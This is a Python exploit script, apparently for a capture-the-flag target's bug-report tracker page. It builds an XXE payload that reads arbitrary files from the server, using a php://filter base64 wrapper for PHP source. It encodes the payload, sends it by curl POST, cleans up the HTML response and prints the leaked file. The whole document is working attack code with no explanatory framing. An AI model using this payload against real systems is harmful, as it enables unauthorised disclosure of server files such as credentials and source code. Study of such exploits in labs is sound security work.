import base64
import urllib.parse
import subprocess
import requests
from sys import argv

if len(argv) <= 1:
	print("USAGE: python exploit.py <IP> <FILE>")
	exit(1)


def encode_all(string):
    return "".join("%{0:0>2x}".format(ord(char)) for char in string)

ip = argv[1]
file = argv[2]
is_php = False
xxe_start="file://"
if ".php" in file:
	is_php = True
	xxe_start="php://filter/read=convert.base64-encode/resource="

data = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{xxe_start}{file}"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>"""
data = str.encode(data)
# Base64 encode the data
base64_encoded = base64.b64encode(data).decode("ascii")
url_encoded=encode_all(base64_encoded)

# Use --data for URL encoded data
command = ['curl','-X','POST',f'http://{ip}/tracker_diRbPr00f314.php','--data',f"data={url_encoded}"]
p = subprocess.run(command,capture_output=True)
file = p.stdout.decode("ascii")
file = file.strip("""If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>""")
file = file.strip("""</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>tes
""")

if is_php:
	file=base64.b64decode(file)
	print(file.decode("utf-8"))
else:
	print(file)
